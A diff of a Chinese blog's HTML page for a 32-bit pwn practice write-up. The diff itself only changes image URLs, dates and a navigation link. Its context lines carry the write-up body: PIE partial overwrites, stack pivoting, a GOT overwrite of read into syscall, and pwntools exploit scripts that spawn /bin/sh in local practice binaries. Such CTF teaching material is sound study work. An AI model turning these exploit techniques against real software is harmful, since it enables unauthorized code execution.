@@ -114,21 +114,21 @@
 <meta property="og:site_name" content="Veritas501&#39;s Blog">
 <meta property="og:description" content="这是几道关于read和write的练习题，因为是练习题，就不用太花里胡哨了，只保留漏洞点就可以了。嗯，大概是就是只有两句代码的意思吧。">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_7769e46c0e37d06fb43528af42054741.png">
-<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_f52af45f237fb13bbc9ff6ae98e456be.png">
-<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_c454ca10d50fe6de5479708f076c3086.png">
-<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_043af3e9c72f9e020e63f4ebb0e9543f.png">
-<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_bc511cc3a4f1cc0f6271fe84ae7edc3a.png">
-<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_c6cd16719f98f4584d3a1da0cde4a015.png">
-<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_5988e4083ce15b6df2fdd8c6d5294a02.png">
-<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_41120c19934ea1128f40319391c7c7fc.png">
-<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_accf0df1b7a0dfef64d8af65c8add828.png">
-<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_1b5247ed4d475e444e4510d403db9e90.png">
-<meta property="og:updated_time" content="2017-08-25T06:33:45.284Z">
+<meta property="og:image" content="http://img2.tan90.me/read_write_7769e46c0e37d06fb43528af42054741.png">
+<meta property="og:image" content="http://img2.tan90.me/read_write_f52af45f237fb13bbc9ff6ae98e456be.png">
+<meta property="og:image" content="http://img2.tan90.me/read_write_c454ca10d50fe6de5479708f076c3086.png">
+<meta property="og:image" content="http://img2.tan90.me/read_write_043af3e9c72f9e020e63f4ebb0e9543f.png">
+<meta property="og:image" content="http://img2.tan90.me/read_write_bc511cc3a4f1cc0f6271fe84ae7edc3a.png">
+<meta property="og:image" content="http://img2.tan90.me/read_write_c6cd16719f98f4584d3a1da0cde4a015.png">
+<meta property="og:image" content="http://img2.tan90.me/read_write_5988e4083ce15b6df2fdd8c6d5294a02.png">
+<meta property="og:image" content="http://img2.tan90.me/read_write_41120c19934ea1128f40319391c7c7fc.png">
+<meta property="og:image" content="http://img2.tan90.me/read_write_accf0df1b7a0dfef64d8af65c8add828.png">
+<meta property="og:image" content="http://img2.tan90.me/read_write_1b5247ed4d475e444e4510d403db9e90.png">
+<meta property="og:updated_time" content="2018-09-20T06:34:26.033Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="32位下花样read_write">
 <meta name="twitter:description" content="这是几道关于read和write的练习题，因为是练习题，就不用太花里胡哨了，只保留漏洞点就可以了。嗯，大概是就是只有两句代码的意思吧。">
-<meta name="twitter:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_7769e46c0e37d06fb43528af42054741.png">
+<meta name="twitter:image" content="http://img2.tan90.me/read_write_7769e46c0e37d06fb43528af42054741.png">
 
 
 
@@ -373,7 +373,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2017-08-25 14:33:45" itemprop="dateModified" datetime="2017-08-25T14:33:45+08:00">2017-08-25</time>
+                <time title="Modified: 2018-09-20 14:34:26" itemprop="dateModified" datetime="2018-09-20T14:34:26+08:00">2018-09-20</time>
               
             
           </span>
@@ -454,7 +454,7 @@
 <p><strong>重点</strong>：pie有一个特点，他是按页来随机的，所以最低的一字节是不会改变的。我们通过溢出只修改返回值的最低位（little-endian所以在最低位在低址上）就可以<strong>实现0x100范围内的短跳</strong>。</p>
 <p>这里，程序本来会跳转到main的结尾，现在我们可以覆盖一字节让他从新跳到main上，有了二次输入的机会。</p>
 <p>另一方面我们从刚才write出来的0x100字节中可以得到开了pie以后code段的基地址和libc中某些函数地址的信息。</p>
-<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_7769e46c0e37d06fb43528af42054741.png" alt=""></p>
+<p><img src="http://img2.tan90.me/read_write_7769e46c0e37d06fb43528af42054741.png" alt=""></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cn.recvuntil(<span class="string">'bbbb'</span>)</span><br><span class="line">base = u32(cn.recv(<span class="number">4</span>)) - <span class="number">0x655</span></span><br><span class="line">cn.recv(<span class="number">4</span>*<span class="number">3</span>)</span><br><span class="line">p_libc_start_main = u32(cn.recv(<span class="number">4</span>)) - <span class="number">247</span></span><br><span class="line">cn.recv()</span><br></pre></td></tr></table></figure>
 <p>有了这两点就可以直接算出system和/bin/sh的地址，以及欲跳转到的代码的地址，直接用一次rop调用system拿shell即可。</p>
 <p>下面就是不需要爆破的poc：</p>
@@ -475,14 +475,14 @@
 <p>由于要不断调用read且不能使用rop，所以后面我们一直把ret改成main。</p>
 <p>这里我们伪造两个栈区，dataA(fake stack) = 0x0804A000 + 0x200 , dataB(fake stack) = 0x0804A000 + 0x400</p>
 <p>一开始，我们的栈是这样的：</p>
-<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_f52af45f237fb13bbc9ff6ae98e456be.png" alt=""></p>
+<p><img src="http://img2.tan90.me/read_write_f52af45f237fb13bbc9ff6ae98e456be.png" alt=""></p>
 <p>然后我们通过栈溢出把ebp改成了dataA,ret改到main，再次输入的时候，我们把之前的‘a’*0x28的padding改成我们打算执行的ROP代码。<br>（后面的leave是 mov esp,ebp ; pop ebp）</p>
-<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_c454ca10d50fe6de5479708f076c3086.png" alt=""></p>
+<p><img src="http://img2.tan90.me/read_write_c454ca10d50fe6de5479708f076c3086.png" alt=""></p>
 <p>下面的ebp我们填成dataB,ret以后变成这样：<br>（后面的leave是 mov esp,ebp ; pop ebp）</p>
-<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_043af3e9c72f9e020e63f4ebb0e9543f.png" alt=""></p>
+<p><img src="http://img2.tan90.me/read_write_043af3e9c72f9e020e63f4ebb0e9543f.png" alt=""></p>
 <p>由于代码中push和pop操作，且esp在dataA区域，所以ROP（part1）后面的部分代码会被破坏（x64没有这种情况），在dataB中填入’A’*0x28的padding，ebp改到dataA的后面准备继续修补ROP。</p>
-<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_bc511cc3a4f1cc0f6271fe84ae7edc3a.png" alt=""></p>
-<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_c6cd16719f98f4584d3a1da0cde4a015.png" alt=""></p>
+<p><img src="http://img2.tan90.me/read_write_bc511cc3a4f1cc0f6271fe84ae7edc3a.png" alt=""></p>
+<p><img src="http://img2.tan90.me/read_write_c6cd16719f98f4584d3a1da0cde4a015.png" alt=""></p>
 <p>经过gdb调试，一个part的大小为0xC，通过分段多次写入，最后在dataA就保存了我们需要的ROP。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#overflow_length = 0x28</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">	pay = <span class="string">'a'</span>*<span class="number">0x28</span> + p32(addr + <span class="number">0x28</span>) + p32(code_read)</span><br><span class="line">	cn.send(pay)</span><br><span class="line">	cn.recv()</span><br><span class="line">	pay = data.ljust(<span class="number">0x28</span>,<span class="string">'\xff'</span>) + p32(<span class="number">0x0804A000</span> + <span class="number">0x400</span>) + p32(code_read)</span><br><span class="line">	cn.send(pay)</span><br><span class="line">	cn.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeall</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">	n = len(data)//<span class="number">0xc</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">		write(addr +i*<span class="number">0xc</span>,data[i*<span class="number">0xc</span>:(i+<span class="number">1</span>)*<span class="number">0xc</span>])</span><br><span class="line">	i += <span class="number">1</span></span><br><span class="line">	write(addr+i*<span class="number">0xc</span>,data[i*<span class="number">0xc</span>:])</span><br></pre></td></tr></table></figure>
 <p>接着只要把ret改到dataA的rop前的4字节，然后把ret改到leave；ret就可以调用我们的ROP了。</p>
@@ -501,10 +501,10 @@
 <p><strong>重点</strong>：在libc.so中，read的后面不远处有一个syscall，相对距离小于0x100，由于libc开了pie而pie不随机最低一字节的特点，我们把read的got改成syscall。</p>
 <p>来看一下libc.so的反汇编代码</p>
 <p><strong>x86:</strong></p>
-<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_5988e4083ce15b6df2fdd8c6d5294a02.png" alt=""></p>
+<p><img src="http://img2.tan90.me/read_write_5988e4083ce15b6df2fdd8c6d5294a02.png" alt=""></p>
 <p>对，下面那个call奇怪地址的代码就是syscall，之所以长这样是因为在x86上，调用一个int0x80的代价是很大，有些syscall的调用是很频繁的（如获取时间的sys_time），如果都用int0x80来做会使系统的运行速度大大减慢，因此产生了vdso，加快调用的速度（具体怎么加速的我目前也不知道），总之上面那个<code>call    large dword ptr gs:10h</code>就是int0x80的作用。</p>
 <p><strong>x64:</strong></p>
-<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_41120c19934ea1128f40319391c7c7fc.png" alt=""></p>
+<p><img src="http://img2.tan90.me/read_write_41120c19934ea1128f40319391c7c7fc.png" alt=""></p>
 <p>下面两个都是syscall，当然具体情况要看自己的libc。</p>
 <table>
 <thead>
@@ -539,9 +539,9 @@
 <p>checksec:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
 <p>大体和pwn4一样，就是没有了atoi设置eax，但是我们可以通过read的入读字节数设置eax。这里有一个问题，我们要把got表的read改成syscall，但是又要使eax设置成0xB来调用syscall，这两者必须同时发生，所以我们在read之前多读一些’\0‘字节，总共读入11字节，且覆盖read的最低一字节，使read改到syscall。</p>
-<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_accf0df1b7a0dfef64d8af65c8add828.png" alt=""></p>
+<p><img src="http://img2.tan90.me/read_write_accf0df1b7a0dfef64d8af65c8add828.png" alt=""></p>
 <p>此外，根据gdb调试，这次没有上次那么幸运，edx在调用syscall的时候并不是0，所以调用是失败的，但根据人脑查找，这个程序有这样一处代码可以当gadget用。</p>
-<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_1b5247ed4d475e444e4510d403db9e90.png" alt=""></p>
+<p><img src="http://img2.tan90.me/read_write_1b5247ed4d475e444e4510d403db9e90.png" alt=""></p>
 <p>最后依然是通过syscall执行execve(“/bin/sh”,0,0)。</p>
 <p>poc：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">'./pwn5_2'</span>)</span><br><span class="line"></span><br><span class="line">bin = ELF(<span class="string">'./pwn5_2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	<span class="keyword">return</span> raw_input()</span><br><span class="line"></span><br><span class="line">p1ret = <span class="number">0x080482c9</span></span><br><span class="line">p3ret = <span class="number">0x080484a9</span></span><br><span class="line">p_ebx_ret = p1ret</span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x28</span> + <span class="string">'bbbb'</span> </span><br><span class="line">pay += p32(bin.plt[<span class="string">'read'</span>]) + p32(p3ret) + p32(<span class="number">0</span>) + p32(bin.bss()) + p32(<span class="number">0x20</span>)</span><br><span class="line">pay += p32(bin.plt[<span class="string">'read'</span>]) + p32(p3ret) + p32(<span class="number">0</span>) + p32(bin.got[<span class="string">'read'</span>]<span class="number">-0xa</span>) + p32(<span class="number">0xb</span>)</span><br><span class="line">pay += p32(p_ebx_ret) + p32(bin.bss())</span><br><span class="line">pay += p32(<span class="number">0x08048398</span>)<span class="comment">#set edx to zero</span></span><br><span class="line">pay += p32(bin.plt[<span class="string">'read'</span>])</span><br><span class="line"></span><br><span class="line">z()</span><br><span class="line">cn.send(pay)</span><br><span class="line">z()</span><br><span class="line">cn.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">z()</span><br><span class="line">cn.send(<span class="string">'\x00'</span>*<span class="number">0xa</span>+<span class="string">'\xdc'</span>)</span><br><span class="line">z()</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
@@ -602,8 +602,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/04/23/Linux Syscall Reference x86/" rel="prev" title="Linux Syscall Reference x86">
-                Linux Syscall Reference x86 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/04/23/Linux Syscall Reference x64/" rel="prev" title="Linux Syscall Reference x64">
+                Linux Syscall Reference x64 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
